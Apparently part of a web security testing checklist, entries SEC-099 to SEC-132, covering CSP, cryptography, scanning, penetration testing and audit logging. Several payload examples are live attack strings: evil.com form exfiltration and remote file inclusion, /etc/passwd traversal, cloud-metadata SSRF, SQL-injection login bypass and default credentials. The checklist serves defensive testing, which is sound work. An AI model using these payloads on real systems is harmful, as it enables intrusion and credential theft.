**Test Category:** Security Misconfiguration (WSTG-CONF-07) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Content Security Policy

**Test Steps:** 1. Check if CSP report-uri or report-to is configured. 2. Test if the reporting endpoint is accessible without authentication. 3. Attempt to flood the reporting endpoint. 4. Check for sensitive data in CSP reports.

**Expected Result:** CSP reporting endpoints must be protected against abuse and must not expose sensitive information in violation reports.

**Payload Example:**

```
Send crafted CSP violation reports to /csp-report;flood endpoint;check if reports contain sensitive URL paths or data
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Burp Suite;Postman

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## SEC-100 — CSP base-uri Directive Check
**Test Category:** Security Misconfiguration (WSTG-CONF-07) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Content Security Policy

**Test Steps:** 1. Check if CSP includes base-uri directive. 2. If missing inject a base tag to hijack relative URLs. 3. Test if script loading can be redirected via base URI injection. 4. Verify base-uri is set to self or none.

**Expected Result:** CSP must include base-uri 'self' or base-uri 'none' to prevent base tag injection attacks that redirect relative script URLs.

**Payload Example:**

```
Inject <base href='https://evil.com/'> and check if relative script src loads from attacker domain
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Burp Suite;Browser DevTools

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## SEC-101 — CSP object-src and plugin-types Check
**Test Category:** Security Misconfiguration (WSTG-CONF-07) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Content Security Policy

**Test Steps:** 1. Check if CSP restricts object-src. 2. Verify plugin-types directive if objects are allowed. 3. Test if Flash or Java applets can be loaded. 4. Check for PDF plugin exploitation.

**Expected Result:** CSP must restrict object-src to 'none' unless specific plugin requirements exist to prevent plugin-based attacks.

**Payload Example:**

```
Check for object-src 'none';test <object data='https://evil.com/exploit.swf'>;test <embed src='malicious.pdf'>
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Burp Suite;Browser DevTools

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## SEC-102 — CSP form-action Directive Check
**Test Category:** Security Misconfiguration (WSTG-CONF-07) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Content Security Policy

**Test Steps:** 1. Check if CSP includes form-action directive. 2. If missing inject a form with action pointing to attacker server. 3. Test if form data can be exfiltrated via unrestricted form-action. 4. Check for dangling markup injection.

**Expected Result:** CSP must include form-action directive to prevent form data exfiltration through injected forms pointing to attacker-controlled servers.

**Payload Example:**

```
Inject <form action='https://evil.com/steal'><button>Submit</button></form>;test form-action restriction
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Burp Suite;Browser DevTools

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## SEC-103 — Data in Transit Encryption Verification
**Test Category:** Cryptography (WSTG-CRYP-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Encryption (At Rest / In Transit)

**Test Steps:** 1. Monitor all network traffic between client and server. 2. Verify all communications use TLS. 3. Check for any plain-text data transmission. 4. Verify API communications are encrypted. 5. Check WebSocket encryption (wss://).

**Expected Result:** All data in transit must be encrypted using TLS 1.2+ with no plain-text fallback for any communication channel.

**Payload Example:**

```
Capture traffic with Wireshark;check for HTTP requests;verify all API calls use HTTPS;check WebSocket uses wss://
```

**Impact:** Weak/broken cryptography -&gt; data exposure, token forgery, integrity bypass.

**Tools:** Wireshark;Burp Suite;SSLscan

**References:** CWE-327; OWASP Cryptographic Failures (A02); WSTG-CRYP

---

## SEC-104 — Password Hashing Algorithm Verification
**Test Category:** Cryptography (WSTG-CRYP-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Encryption (At Rest / In Transit)

**Test Steps:** 1. Check password storage mechanism. 2. Verify strong hashing algorithm like bcrypt or scrypt or Argon2 is used. 3. Check for salting. 4. Verify no MD5 or SHA1 or unsalted hashes. 5. Check work factor configuration.

**Expected Result:** Passwords must be hashed using Argon2 or bcrypt or scrypt with unique salts per password and an appropriate work factor.

**Payload Example:**

```
Register account then check database for password_hash format;verify $2b$ (bcrypt) or $argon2 prefix;check for MD5/SHA1/plain-text
```

**Impact:** Weak/broken cryptography -&gt; data exposure, token forgery, integrity bypass.

**Tools:** Database Analysis;Manual Review

**References:** CWE-327; OWASP Cryptographic Failures (A02); WSTG-CRYP

---

## SEC-105 — Sensitive Data Encryption at Rest
**Test Category:** Cryptography (WSTG-CRYP-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Encryption (At Rest / In Transit)

**Test Steps:** 1. Check database for encrypted sensitive fields. 2. Verify PII and payment data encryption. 3. Check encryption algorithm strength (AES-256). 4. Verify key management practices. 5. Check for encrypted backups.

**Expected Result:** Sensitive data including PII and payment information must be encrypted at rest using AES-256 or equivalent with proper key management.

**Payload Example:**

```
Check database for plaintext credit_card;ssn;personal_data fields;verify AES-256 encryption;check backup encryption
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Database Analysis;Manual Review

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## SEC-106 — Encryption Key Management Assessment
**Test Category:** Cryptography (WSTG-CRYP-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Encryption (At Rest / In Transit)

**Test Steps:** 1. Check where encryption keys are stored. 2. Verify keys are not hardcoded in source code. 3. Check for key rotation mechanisms. 4. Verify key separation between environments. 5. Check for HSM or KMS usage.

**Expected Result:** Encryption keys must be stored in secure key management systems and not in source code with regular rotation and environment separation.

**Payload Example:**

```
Search source code for hardcoded keys;check for encryption_key=;aes_key=;secret_key= in configuration files
```

**Impact:** Weak/broken cryptography -&gt; data exposure, token forgery, integrity bypass.

**Tools:** GitLeaks;TruffleHog;Manual Review

**References:** CWE-327; OWASP Cryptographic Failures (A02); WSTG-CRYP

---

## SEC-107 — Weak Encryption Algorithm Detection
**Test Category:** Cryptography (WSTG-CRYP-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Encryption (At Rest / In Transit)

**Test Steps:** 1. Identify all encryption algorithms used. 2. Check for DES or 3DES or RC4 or MD5 usage. 3. Verify RSA key length is at least 2048 bits. 4. Check for ECB mode usage. 5. Verify IV generation for CBC mode.

**Expected Result:** Application must use only strong encryption algorithms (AES-256-GCM or ChaCha20-Poly1305) and avoid deprecated or weak algorithms.

**Payload Example:**

```
Check for DES;3DES;RC4;Blowfish;MD5 for encryption;RSA < 2048 bits;AES-ECB mode;static or predictable IVs
```

**Impact:** Weak/broken cryptography -&gt; data exposure, token forgery, integrity bypass.

**Tools:** Source Code Analysis;Custom Scripts

**References:** CWE-327; OWASP Cryptographic Failures (A02); WSTG-CRYP

---

## SEC-108 — Token and Session Encryption Assessment
**Test Category:** Cryptography (WSTG-CRYP-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Encryption (At Rest / In Transit)

**Test Steps:** 1. Analyze session token generation for entropy. 2. Check JWT signing algorithms. 3. Verify API tokens are properly encrypted or hashed. 4. Check for weak token signing secrets. 5. Test for algorithm confusion.

**Expected Result:** Session tokens and API keys must be generated with sufficient entropy and JWTs must use strong signing algorithms (RS256 or ES256) not HS256 with weak secrets.

**Payload Example:**

```
Analyze token entropy with Burp Sequencer;crack JWT HS256 with jwt_tool;test for alg=none bypass;check for weak secrets
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite Sequencer;jwt_tool;Hashcat

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## SEC-109 — Database Connection Encryption
**Test Category:** Cryptography (WSTG-CRYP-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Encryption (At Rest / In Transit)

**Test Steps:** 1. Check if database connections use TLS. 2. Verify database connection strings for SSL parameters. 3. Check for plain-text database credentials in configuration. 4. Test for database traffic encryption.

**Expected Result:** Database connections must use TLS encryption and credentials must be stored securely in environment variables or secret management systems.

**Payload Example:**

```
Check connection strings for sslmode=require;verify database traffic encryption;check for plaintext DB credentials
```

**Impact:** Weak/broken cryptography -&gt; data exposure, token forgery, integrity bypass.

**Tools:** Wireshark;Configuration Review

**References:** CWE-327; OWASP Cryptographic Failures (A02); WSTG-CRYP

---

## SEC-110 — File Storage Encryption Verification
**Test Category:** Cryptography (WSTG-CRYP-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Encryption (At Rest / In Transit)

**Test Steps:** 1. Check if uploaded files are encrypted at rest. 2. Verify S3 bucket encryption settings. 3. Check local file storage encryption. 4. Verify temporary files are encrypted. 5. Check log file encryption.

**Expected Result:** User-uploaded files and sensitive data files must be encrypted at rest using server-side encryption with proper key management.

**Payload Example:**

```
Check S3 for ServerSideEncryption;verify local file encryption;check temporary file handling;audit log storage encryption
```

**Impact:** Weak/broken cryptography -&gt; data exposure, token forgery, integrity bypass.

**Tools:** AWS CLI;Manual Review

**References:** CWE-327; OWASP Cryptographic Failures (A02); WSTG-CRYP

---

## SEC-111 — Email Encryption Verification
**Test Category:** Cryptography (WSTG-CRYP-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Encryption (At Rest / In Transit)

**Test Steps:** 1. Check if transactional emails use TLS for SMTP. 2. Verify STARTTLS enforcement. 3. Check for sensitive data in email content. 4. Verify email encryption for sensitive communications.

**Expected Result:** Application must enforce TLS for all SMTP communications and minimize sensitive data in email content.

**Payload Example:**

```
Check SMTP connection for STARTTLS;verify opportunistic vs mandatory TLS;inspect email headers for encryption status
```

**Impact:** Weak/broken cryptography -&gt; data exposure, token forgery, integrity bypass.

**Tools:** OpenSSL;SMTP Tester;Wireshark

**References:** CWE-327; OWASP Cryptographic Failures (A02); WSTG-CRYP

---

## SEC-112 — Automated Vulnerability Scanner Execution
**Test Category:** Vulnerability Assessment (WSTG-INFO-08) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Vulnerability Scanning

**Test Steps:** 1. Run automated vulnerability scanners against the application. 2. Configure scanner with authentication credentials. 3. Set appropriate scan policies covering OWASP Top 10. 4. Review and validate all findings. 5. Eliminate false positives.

**Expected Result:** Application must be free from vulnerabilities detectable by automated scanning tools including all OWASP Top 10 categories.

**Payload Example:**

```
Run full authenticated scan with OWASP ZAP;Burp Suite Active Scanner;Nikto;Nuclei against all application endpoints
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** OWASP ZAP;Burp Suite Pro;Nikto;Nuclei;Nessus

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## SEC-113 — Dependency Vulnerability Scanning
**Test Category:** Supply Chain (WSTG-CONF-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Vulnerability Scanning

**Test Steps:** 1. Scan all application dependencies for known vulnerabilities. 2. Check frontend JavaScript libraries. 3. Check backend framework dependencies. 4. Verify container base image vulnerabilities. 5. Check for end-of-life components.

**Expected Result:** All application dependencies must be free from known critical and high vulnerabilities and end-of-life components must be replaced.

**Payload Example:**

```
Run npm audit;pip-audit;OWASP Dependency-Check;Snyk;Trivy on all project dependencies
```

**Impact:** Supply-chain / dependency confusion -&gt; build &amp; CI compromise -&gt; RCE.

**Tools:** OWASP Dependency-Check;Snyk;npm audit;retire.js;Trivy

**References:** CWE-829; -&gt;[Dependency Confusion checklist](#/checklist/depconfusion); Alex Birsan Dependency Confusion

---

## SEC-114 — Infrastructure Vulnerability Assessment
**Test Category:** Security Misconfiguration (WSTG-CONF-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Vulnerability Scanning

**Test Steps:** 1. Scan server infrastructure for known vulnerabilities. 2. Check open ports and services. 3. Verify OS patch levels. 4. Check web server and application server versions. 5. Test for default credentials.

**Expected Result:** Server infrastructure must be patched to current levels with no unnecessary services exposed and no default credentials.

**Payload Example:**

```
Run Nessus or OpenVAS scan;run Nmap service detection;check for default credentials;verify patch levels
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Nessus;OpenVAS;Nmap;Metasploit

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## SEC-115 — SSL/TLS Vulnerability Scanning
**Test Category:** Cryptography (WSTG-CRYP-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Vulnerability Scanning

**Test Steps:** 1. Scan for known SSL/TLS vulnerabilities. 2. Check for Heartbleed and POODLE and BEAST and CRIME and BREACH. 3. Check for ROBOT vulnerability. 4. Verify OCSP stapling. 5. Check for certificate transparency.

**Expected Result:** Application must be free from all known SSL/TLS vulnerabilities with proper certificate transparency and OCSP stapling.

**Payload Example:**

```
Run testssl.sh;SSLscan;Qualys SSL Labs test;check for CVE-2014-0160;CVE-2014-3566;CVE-2011-3389
```

**Impact:** Weak/broken cryptography -&gt; data exposure, token forgery, integrity bypass.

**Tools:** testssl.sh;SSLscan;Qualys SSL Labs;Nmap

**References:** CWE-327; OWASP Cryptographic Failures (A02); WSTG-CRYP

---

## SEC-116 — Web Application Firewall Effectiveness
**Test Category:** Security Misconfiguration (WSTG-CONF-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Vulnerability Scanning

**Test Steps:** 1. Test WAF detection and effectiveness. 2. Send common attack payloads and verify blocking. 3. Test WAF bypass techniques. 4. Check WAF mode (detection vs blocking). 5. Verify WAF logging.

**Expected Result:** WAF must effectively block common attack patterns while minimizing false positives and must log all blocked requests.

**Payload Example:**

```
Send OWASP Top 10 payloads through WAF;test bypass techniques;verify blocking mode;check WAF logs
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Burp Suite;WAF bypass tools;Nuclei;Custom Scripts

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## SEC-117 — Container Security Scanning
**Test Category:** Security Misconfiguration (WSTG-CONF-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Vulnerability Scanning

**Test Steps:** 1. Scan container images for vulnerabilities. 2. Check for running as root. 3. Verify no sensitive data in container layers. 4. Check for exposed secrets in Dockerfiles. 5. Verify minimal base images.

**Expected Result:** Container images must be free from critical vulnerabilities with minimal base images and no hardcoded secrets or root user execution.

**Payload Example:**

```
Run Trivy;Clair;Anchore on container images;check Dockerfile for secrets;verify USER directive
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Trivy;Clair;Anchore;Hadolint

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## SEC-118 — API Security Scanning
**Test Category:** Vulnerability Assessment (WSTG-INFO-08) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Vulnerability Scanning

**Test Steps:** 1. Import API specification (OpenAPI/Swagger). 2. Run automated API security tests. 3. Check for broken authentication and authorization. 4. Test for injection vulnerabilities in all endpoints. 5. Verify rate limiting on all APIs.

**Expected Result:** All API endpoints must be free from OWASP API Security Top 10 vulnerabilities including BOLA and broken authentication.

**Payload Example:**

```
Import OpenAPI spec into Burp Suite;run API-specific scans;test for BOLA on all endpoints;verify authentication on every endpoint
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Burp Suite;OWASP ZAP;Postman;Dredd

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## SEC-119 — Cloud Configuration Security Assessment
**Test Category:** Security Misconfiguration (WSTG-CONF-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Vulnerability Scanning

**Test Steps:** 1. Scan cloud infrastructure configuration. 2. Check for publicly accessible storage buckets. 3. Verify IAM policies follow least privilege. 4. Check security group rules. 5. Verify encryption settings.

**Expected Result:** Cloud infrastructure must follow security best practices with no public storage exposure and least privilege IAM and proper encryption.

**Payload Example:**

```
Run ScoutSuite;Prowler;CloudSploit;check S3 buckets;verify IAM policies;check security groups
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** ScoutSuite;Prowler;CloudSploit;AWS CLI

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## SEC-120 — Authentication Bypass Testing
**Test Category:** Authentication (WSTG-ATHN-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Penetration Testing

**Test Steps:** 1. Test for default credentials on all login interfaces. 2. Test for authentication bypass via SQL injection. 3. Test for parameter manipulation to bypass auth. 4. Check for forced browsing to authenticated pages. 5. Test for session fixation.

**Expected Result:** Application must resist all authentication bypass attempts and enforce proper authentication on every request to protected resources.

**Payload Example:**

```
Test admin:admin;admin:password;root:root;test SQL injection bypass ' OR 1=1--;test direct URL access to protected pages
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite;Hydra;Custom Scripts

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## SEC-121 — Privilege Escalation Testing
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Penetration Testing

**Test Steps:** 1. Login as a low-privileged user. 2. Attempt to access admin functionality. 3. Modify role or privilege parameters. 4. Test horizontal privilege escalation between same-level users. 5. Test vertical escalation to admin.

**Expected Result:** Application must enforce proper authorization on all operations preventing both vertical and horizontal privilege escalation.

**Payload Example:**

```
Change role=user to role=admin in JWT or request;access /admin/* endpoints;modify user_id to access other users' data
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;jwt_tool;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SEC-122 — Session Management Testing
**Test Category:** Session Management (WSTG-SESS-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Penetration Testing

**Test Steps:** 1. Analyze session token generation entropy. 2. Test for session fixation. 3. Test session timeout. 4. Verify session invalidation on logout. 5. Test concurrent session handling. 6. Check for session in URL.

**Expected Result:** Application must implement secure session management with high-entropy tokens and proper timeout and invalidation and no URL-based sessions.

**Payload Example:**

```
Analyze session token with Burp Sequencer;test session reuse after logout;check for session in URL parameters;test concurrent sessions
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite Sequencer;Custom Scripts

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## SEC-123 — Business Logic Flaw Testing
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Penetration Testing

**Test Steps:** 1. Map application workflows and business processes. 2. Test for logic bypass by skipping steps. 3. Test for race conditions on critical operations. 4. Test negative values and boundary conditions. 5. Test parameter tampering on business-critical values.

**Expected Result:** Application must enforce business logic server-side with proper validation of workflow sequences and value constraints.

**Payload Example:**

```
Skip payment step in checkout;submit negative quantities;modify prices client-side;bypass approval workflows;exploit race conditions
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Turbo Intruder;Custom Scripts

**References:** CWE-840; PortSwigger Business logic

---

## SEC-124 — Server-Side Request Forgery Deep Testing
**Test Category:** SSRF (WSTG-INPV-19) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Penetration Testing

**Test Steps:** 1. Identify all URL input points. 2. Test with internal IP ranges. 3. Test with cloud metadata URLs. 4. Test with DNS rebinding. 5. Test with URL scheme variations. 6. Test for blind SSRF.

**Expected Result:** Application must validate and restrict all server-side URL fetching to prevent access to internal resources and cloud metadata.

**Payload Example:**

```
url=http://169.254.169.254;url=http://metadata.google.internal;url=http://[::ffff:169.254.169.254];url=http://0x7f000001;url=gopher://
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite;Collaborator;SSRFMap

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## SEC-125 — File Inclusion Testing (LFI/RFI)
**Test Category:** Path Traversal (WSTG-INPV-10) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Penetration Testing

**Test Steps:** 1. Identify file inclusion parameters. 2. Test for Local File Inclusion using path traversal. 3. Test for Remote File Inclusion with external URLs. 4. Test with PHP wrappers and filters. 5. Test with null byte termination.

**Expected Result:** Application must validate file inclusion parameters against a whitelist and never use user input directly in file operations.

**Payload Example:**

```
page=../../../etc/passwd;file=php://filter/convert.base64-encode/resource=config.php;include=http://evil.com/shell.php
```

**Impact:** Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE.

**Tools:** Burp Suite;LFISuite;Custom Scripts

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai

---

## SEC-126 — Insecure Deserialization Testing
**Test Category:** Injection (WSTG-INPV-08) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Penetration Testing

**Test Steps:** 1. Identify serialized data in cookies and parameters and APIs. 2. Detect serialization format. 3. Generate malicious serialized objects. 4. Test for remote code execution. 5. Test for object manipulation.

**Expected Result:** Application must avoid deserializing untrusted data and implement type-safe deserialization with integrity checks.

**Payload Example:**

```
Java ysoserial payloads;PHP PHPGGC chains;Python pickle exploits;.NET ObjectStateFormatter gadgets;Ruby Marshal
```

**Impact:** Insecure deserialization -&gt; remote code execution.

**Tools:** ysoserial;PHPGGC;Burp Suite;Custom Scripts

**References:** CWE-502; -&gt;[Insecure Deserialization checklist](#/checklist/deser); Bechler 'Java Unmarshaller Security'; ysoserial

---

## SEC-127 — Mass Assignment Testing
**Test Category:** Mass Assignment (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Penetration Testing

**Test Steps:** 1. Identify all API endpoints that accept object creation or update. 2. Add unexpected parameters like role and admin and verified. 3. Test with nested objects. 4. Check for parameter binding vulnerabilities.

**Expected Result:** Application must whitelist allowed parameters for each operation and reject any unauthorized additional parameters.

**Payload Example:**

```
Add role=admin&is_verified=true&is_superuser=true&account_balance=999999 to registration and profile update requests
```

**Impact:** Mass assignment / parameter pollution -&gt; privilege escalation (role/isAdmin/isVerified) or ownership takeover.

**Tools:** Burp Suite;Postman;Arjun

**References:** CWE-915; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Mass assignment; OWASP API3 BOPLA

---

## SEC-128 — API Security Testing
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Penetration Testing

**Test Steps:** 1. Map all API endpoints. 2. Test BOLA on every object-level endpoint. 3. Test BFLA on function-level endpoints. 4. Check for excessive data exposure. 5. Test for lack of resource and rate limiting.

**Expected Result:** All API endpoints must enforce proper object-level and function-level authorization with data minimization and rate limiting.

**Payload Example:**

```
Test GET /api/users/{id} with different IDs;test admin endpoints with user tokens;check for excessive data in responses
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman;OWASP ZAP

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SEC-129 — WebSocket Security Testing
**Test Category:** Injection (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Penetration Testing

**Test Steps:** 1. Identify WebSocket endpoints. 2. Test authentication on WebSocket connections. 3. Test for injection via WebSocket messages. 4. Test for CSWSH (Cross-Site WebSocket Hijacking). 5. Test message integrity.

**Expected Result:** WebSocket connections must be authenticated and authorized with input validation on all messages and CSRF protection.

**Payload Example:**

```
Test ws:// without auth;send injection payloads via WS;test CSWSH from cross-origin;test message tampering
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;wscat;OWASP ZAP

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## SEC-130 — GraphQL Security Testing
**Test Category:** Injection (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Penetration Testing

**Test Steps:** 1. Test for introspection query availability. 2. Check for query depth limits. 3. Test for field-level authorization. 4. Test for batch query abuse. 5. Test for injection in variables.

**Expected Result:** GraphQL endpoints must disable introspection in production and implement query depth limiting and field-level authorization.

**Payload Example:**

```
{__schema{types{name}}};deeply nested queries;batch queries;injection in variables;alias-based DOS
```

**Impact:** GraphQL abuse -&gt; introspection/IDOR/batching DoS -&gt; data exposure or availability.

**Tools:** Burp Suite;InQL;GraphQL Voyager;Altair

**References:** CWE-400; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP GraphQL Cheat Sheet; PortSwigger

---

## SEC-131 — Audit Log Completeness Verification
**Test Category:** Logging (WSTG-CONF-09) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Security Audit Logs

**Test Steps:** 1. Perform various security-relevant actions like login and logout and data changes and admin operations. 2. Check if each action is logged. 3. Verify log entry contains timestamp and user and action and IP and result. 4. Test for missing log entries.

**Expected Result:** Security audit logs must capture all security-relevant events with sufficient detail including timestamp and user and action and source IP and outcome.

**Payload Example:**

```
Perform login;failed login;password change;data modification;admin action;check each generates audit log entry with all required fields
```

**Impact:** Insufficient or injectable logging -&gt; forensic gaps / log injection / audit bypass.

**Tools:** Manual Review;Log Analysis Tools

**References:** CWE-778; OWASP Logging &amp; Monitoring Failures (A09)

---

## SEC-132 — Audit Log Tampering Prevention
**Test Category:** Logging (WSTG-CONF-09) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Security Audit Logs

**Test Steps:** 1. Access the audit log storage. 2. Attempt to modify or delete log entries. 3. Check if logs are append-only. 4. Verify log integrity protection like checksums or signatures. 5. Test for log injection.

**Expected Result:** Audit logs must be tamper-proof with append-only storage and integrity verification and access controls preventing unauthorized modification.

**Payload Example:**

```
Attempt DELETE /api/admin/audit-logs/LOG-001;attempt PUT to modify log entries;check for write-once storage
```

